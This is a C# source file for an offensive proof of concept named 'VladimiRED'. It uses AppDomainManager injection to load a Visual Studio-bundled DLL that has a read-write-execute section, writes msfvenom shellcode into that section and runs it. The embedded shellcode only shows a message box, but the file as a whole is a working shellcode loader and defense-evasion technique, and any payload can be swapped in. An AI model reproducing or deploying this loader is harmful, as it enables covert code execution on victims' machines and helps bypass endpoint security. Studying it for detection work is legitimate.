using System;
using System.Diagnostics;
using System.Runtime.InteropServices;


    public sealed class VladimiRED : AppDomainManager
    {
        //msfvenom  -p windows/x64/messagebox TEXT="VladimiRED" -f csharp
        static byte[] payload = new byte[]
        {
            0xfc,0x48,0x81,0xe4,0xf0,0xff,
            0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
            0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,
            0x50,0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,
            0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,
            0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,
            0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
            0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,
            0x3e,0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
            0xe3,0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,
            0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,
            0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
            0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,
            0x49,0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,
            0x40,0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,
            0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
            0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
            0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,
            0x3e,0x48,0x8d,0x8d,0x24,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,
            0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,
            0x48,0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x19,
            0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,
            0xff,0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,
            0xd5,0x56,0x6c,0x61,0x64,0x69,0x6d,0x69,0x52,0x45,0x44,0x00,
            0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,0x00,0x75,
            0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00
        };


        [StructLayout(LayoutKind.Sequential)]
        struct SectionDescriptor
        {
            public IntPtr Start;
            public IntPtr End;
        }

        // Import necessary WinAPI functions from the correct DLLs
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpLibFileName);

        [DllImport("psapi.dll", SetLastError = true)]
        static extern bool GetModuleInformation(IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb);

        [StructLayout(LayoutKind.Sequential)]
        struct MODULEINFO
        {
            public IntPtr lpBaseOfDll;
            public uint SizeOfImage;
            public IntPtr EntryPoint;
        }

        [DllImport("Dbghelp.dll", SetLastError = true)]
        static extern IntPtr ImageNtHeader(IntPtr hModule);

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_DOS_HEADER
        {
            public ushort e_magic;
            public ushort e_cblp;
            public ushort e_cp;
            public ushort e_crlc;
            public ushort e_cparhdr;
            public ushort e_minalloc;
            public ushort e_maxalloc;
            public ushort e_ss;
            public ushort e_sp;
            public ushort e_csum;
            public ushort e_ip;
            public ushort e_cs;
            public ushort e_lfarlc;
            public ushort e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public ushort[] e_res1;
            public ushort e_oemid;
            public ushort e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public ushort[] e_res2;
            public int e_lfanew;  // File address of the new exe header
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_OPTIONAL_HEADER64
        {
            public ushort Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public ulong ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public ulong SizeOfStackReserve;
            public ulong SizeOfStackCommit;
            public ulong SizeOfHeapReserve;
            public ulong SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_NT_HEADERS
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER OptionalHeader;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_OPTIONAL_HEADER
        {
            // Define fields specific to 32-bit PE files
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_SECTION_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] Name;
            public uint PhysicalAddress;
            public uint VirtualAddress;
            public uint SizeOfRawData;
            public uint PointerToRawData;
            public uint PointerToRelocations;
            public uint PointerToLinenumbers;
            public ushort NumberOfRelocations;
            public ushort NumberOfLinenumbers;
            public uint Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_NT_HEADERS64
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }

        const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
        const uint IMAGE_SCN_MEM_WRITE = 0x80000000;
        const uint IMAGE_SCN_MEM_READ = 0x40000000;

        static IntPtr FindRWXOffset(IntPtr hModule)
        {
            // Get the NT headers
            IntPtr ntHeaderPtr = ImageNtHeader(hModule);
            if (ntHeaderPtr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get NT header.");
                return IntPtr.Zero;
            }

            // Read the NT headers structure
            IMAGE_NT_HEADERS64 ntHeader = Marshal.PtrToStructure<IMAGE_NT_HEADERS64>(ntHeaderPtr);

            // Calculate the pointer to the first section header
            int optionalHeaderSize = ntHeader.FileHeader.SizeOfOptionalHeader;
            IntPtr sectionHeaderPtr = ntHeaderPtr + Marshal.OffsetOf(typeof(IMAGE_NT_HEADERS64), "OptionalHeader").ToInt32() + optionalHeaderSize;

            // Iterate through the section headers to find RWX sections
            for (int i = 0; i < ntHeader.FileHeader.NumberOfSections; i++)
            {
                IMAGE_SECTION_HEADER sectionHeader = Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(sectionHeaderPtr);

                // Check if the section has RWX characteristics
                if ((sectionHeader.Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ)) ==
                    (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ))
                {
                    // Print information about the found section
                    Console.WriteLine($"[i] DLL base address: 0x{hModule.ToString("X")}");
                    Console.WriteLine($"\t[i] RWX section offset (RVA): 0x{sectionHeader.VirtualAddress:X}");
                    Console.WriteLine($"\t[i] RWX section size: 0x{sectionHeader.SizeOfRawData:X} bytes");

                    // Return the relative virtual address (RVA) as the offset
                    return (IntPtr)sectionHeader.VirtualAddress;
                }

                // Move to the next section header
                sectionHeaderPtr = IntPtr.Add(sectionHeaderPtr, Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)));
            }

            Console.WriteLine("[-] No RWX section found.");
            return IntPtr.Zero;
        }

        static uint FindRWXSize(IntPtr hModule)
        {
            // Get the NT headers
            IntPtr ntHeaderPtr = ImageNtHeader(hModule);
            if (ntHeaderPtr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get NT header.");
                return 0;
            }

            IMAGE_NT_HEADERS ntHeaders = Marshal.PtrToStructure<IMAGE_NT_HEADERS>(ntHeaderPtr);
            IntPtr sectionHeaderPtr = GetSectionHeaderPtr(ntHeaderPtr, true);

            // Iterate through the section headers to find RWX sections
            for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++)
            {
                IMAGE_SECTION_HEADER sectionHeader = Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(sectionHeaderPtr);

                // Check if the section has RWX characteristics
                if ((sectionHeader.Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ)) ==
                    (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ))
                {
                    Console.WriteLine($"\t[i] RWX section size: {sectionHeader.SizeOfRawData} bytes");
                    return sectionHeader.SizeOfRawData;
                }

                // Move to the next section header
                sectionHeaderPtr = IntPtr.Add(sectionHeaderPtr, Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)));
            }

            Console.WriteLine("[-] No RWX section found.");
            return 0;
        }


        // Helper function to get section header pointer
        static IntPtr GetSectionHeaderPtr(IntPtr ntHeaderPtr, bool is64Bit)
        {
            int optionalHeaderOffset = Marshal.OffsetOf(typeof(IMAGE_NT_HEADERS), "OptionalHeader").ToInt32();
            int optionalHeaderSize = Marshal.PtrToStructure<IMAGE_NT_HEADERS64>(ntHeaderPtr).FileHeader.SizeOfOptionalHeader;

            return ntHeaderPtr + optionalHeaderOffset + optionalHeaderSize;
        }

        static void WriteCodeToSection(IntPtr rwxSectionAddr, byte[] kitsos, int sizekitsos)
        {
            Marshal.Copy(kitsos, 0, rwxSectionAddr, sizekitsos);
            Console.WriteLine($"[i] {sizekitsos} bytes of code written to RWX memory region");
        }

        static void ExecuteCodeFromSection(IntPtr rwxSectionAddr)
        {
            Console.WriteLine("[i] Calling the RWX region address to execute the payload");
            var execDelegate = (Action)Marshal.GetDelegateForFunctionPointer(rwxSectionAddr, typeof(Action));
            execDelegate();
        }

        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
        string vulnDLLPath = @"C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TeamFoundation\Team Explorer\Git\usr\bin\msys-2.0.dll";
        
        IntPtr hDll = LoadLibrary(vulnDLLPath);

            if (hDll == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to load the targeted DLL");
                return;
            }

            if (!GetModuleInformation(Process.GetCurrentProcess().Handle, hDll, out MODULEINFO moduleInfo, (uint)Marshal.SizeOf(typeof(MODULEINFO))))
            {
                Console.WriteLine("[-] Failed to get module info");
                return;
            }

            IntPtr rwxSectionOffset = FindRWXOffset(hDll);
            uint rwxSectionSize = FindRWXSize(hDll);

            IntPtr rwxSectionAddr = moduleInfo.lpBaseOfDll + (int)rwxSectionOffset;

            SectionDescriptor descriptor = new SectionDescriptor
            {
                Start = rwxSectionAddr,
                End = rwxSectionAddr + (int)rwxSectionSize
            };

            Console.WriteLine($"[i] RWX section starts at 0x{descriptor.Start} and ends at 0x{descriptor.End}");

            int kitsosSize = payload.Length;

            WriteCodeToSection(rwxSectionAddr, payload, kitsosSize);

            ExecuteCodeFromSection(rwxSectionAddr);
        }
    }
